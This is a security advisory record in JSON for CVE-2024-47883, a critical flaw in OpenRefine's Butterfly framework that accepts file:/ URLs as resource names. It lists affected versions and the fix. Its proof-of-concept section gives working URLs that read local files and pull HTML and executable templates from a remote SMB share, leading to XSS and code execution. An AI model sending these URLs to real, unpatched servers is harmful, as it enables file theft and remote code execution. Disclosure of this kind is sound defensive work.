{
  "Severity": "CRITICAL",
  "UpdatedAt": "2024-10-24T18:16:44Z",
  "Package": {
    "Ecosystem": "MAVEN",
    "Name": "org.openrefine.dependencies:butterfly"
  },
  "Advisory": {
    "DatabaseId": 264712,
    "Id": "GSA_kwCzR0hTQS0zcDh2LXc4bXItbTN4OM4ABAoI",
    "GhsaId": "GHSA-3p8v-w8mr-m3x8",
    "References": [
      {
        "Url": "https://github.com/OpenRefine/simile-butterfly/security/advisories/GHSA-3p8v-w8mr-m3x8"
      },
      {
        "Url": "https://github.com/OpenRefine/simile-butterfly/commit/537f64bfa72746f8b21d4bda461fad843435319c"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47883"
      },
      {
        "Url": "https://github.com/advisories/GHSA-3p8v-w8mr-m3x8"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-3p8v-w8mr-m3x8"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2024-47883"
      }
    ],
    "Description": "### Summary\n\nThe Butterfly framework uses the `java.net.URL` class to refer to (what are expected to be) local resource files, like images or templates. This works: \"opening a connection\" to these URLs opens the local file. However, if a `file:/` URL is directly given where a relative path (resource name) is expected, this is also accepted in some code paths; the app then fetches the file, from a remote machine if indicated, and uses it as if it was a trusted part of the app's codebase.\n\nThis leads to multiple weaknesses and potential weaknesses:\n\n* An attacker that has network access to the application could use it to gain access to files, either on the the server's filesystem (path traversal) or shared by nearby machines (server-side request forgery with e.g. SMB).\n* An attacker that can lead or redirect a user to a crafted URL belonging to the app could cause arbitrary attacker-controlled JavaScript to be loaded in the victim's browser (cross-site scripting).\n* If an app is written in such a way that an attacker can influence the resource name used for a template, that attacker could cause the app to fetch and execute an attacker-controlled template (remote code execution).\n\n### Details\n\nThe `edu.mit.simile.butterfly.ButterflyModuleImpl.getResource` method converts a resource name into an URL, for instance:\n\n```\nimages/logo-gem-126.svg\nfile:/C:/Users/Wander/IdeaProjects/OpenRefine/main/webapp/modules/core/images/logo-gem-126.svg\n```\n\nIf the resource name already starts with `file:/`, it is passed through unmodified (line 287). There is no check that the resulting URL is inside the expected directory or on the same machine.\n\nThe default implementation for `process` in `ButterflyModuleImpl` is to serve a named resource, which makes it vulnerable. The Velocity template library is bound to the same `getResource` implementation through the `ButterflyResourceLoader` class, which means it is also vulnerable if template resource names can somehow be influenced by an attacker.\n\n### PoC\n\nThis demonstration has been tested with [OpenRefine](https://github.com/OpenRefine/OpenRefine) on a Windows machine. Start OpenRefine, create a file (here `example.js`) with some contents, then concatenate the OpenRefine URL and its `file:/` URL, as follows:\n\n    http://localhost:3333/file:/C:/Users/Wander/example.js\n\nThe file is read and sent to the browser. Then, visit:\n\n    http://localhost:3333/file:%2f%2fwandernauta.nl/public/demo.html\n\nAssuming there are no firewalls in the way, the HTML page is retrieved from the public SMB (Samba) network share and sent to the browser, which executes the embedded JavaScript.\n\nIn the case of OpenRefine specifically, to demonstrate the attacker-controlled template name case:\n\n    http://localhost:3333/file:%2f%2fwandernauta.nl/public/index\n\nAn `index.vt` template containing the snippet above is retrieved from the same share, which is then executed; the Windows calculator opens.\n\n### Impact\n\nDepending on how the framework is used: path traversal, XSS, SSRF; potentially RCE.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2024-10-24T18:16:43Z",
    "Severity": "CRITICAL",
    "Summary": "Butterfly has path/URL confusion in resource handling leading to multiple weaknesses",
    "UpdatedAt": "2024-10-29T20:01:08Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 9.1,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "1.2.6"
      },
      "VulnerableVersionRange": "\u003c 1.2.6"
    }
  ]
}